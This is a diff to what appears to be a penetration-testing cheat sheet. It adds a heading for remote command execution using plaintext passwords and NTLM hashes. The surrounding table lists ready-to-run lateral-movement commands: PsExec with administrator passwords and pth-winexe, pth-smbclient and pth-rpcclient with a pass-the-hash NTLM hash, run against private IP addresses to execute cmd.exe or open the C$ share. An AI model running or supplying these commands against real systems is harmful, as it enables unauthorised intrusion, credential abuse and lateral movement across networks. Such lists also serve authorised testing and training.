@@ -125,8 +125,9 @@
 | Get-NetFileServer | get a list of file servers used by current domain users|
 
 
+### Remotely Command Execute Using Both Plaintext and NTLM 
 
-| Remot Command Execute  |
+| Remotely Command Execute Using Both Plaintext and NTLM  |
 | ------------- |
 |PsExec64.exe \\192.168.1.104 -u administrator -p forever cmd |
 |psexec \\192.168.122.66 -u Administrator -p 123456Ww ipconfig|
@@ -139,6 +140,8 @@
 |pth-wims -U WORKGROUP/Administrator%aad3b435b51404eeaad3b435b51404ee:C0F2E311D3F450A7FF2571BB59FBEDE5 //192.168.1.25 "cmd.exe /c whoami > c:\temp\result.txt"|
 |pth-smbclient -U WORKGROUP/Administrator%aad3b435b51404eeaad3b435b51404ee:C0F2E311D3F450A7FF2571BB59FBEDE5 //192.168.1.25/c$|
 |pth-rpcclient -U WORKGROUP/Administrator%aad3b435b51404eeaad3b435b51404ee:C0F2E311D3F450A7FF2571BB59FBEDE5 //192.168.1.25|
+
+
 
 
 
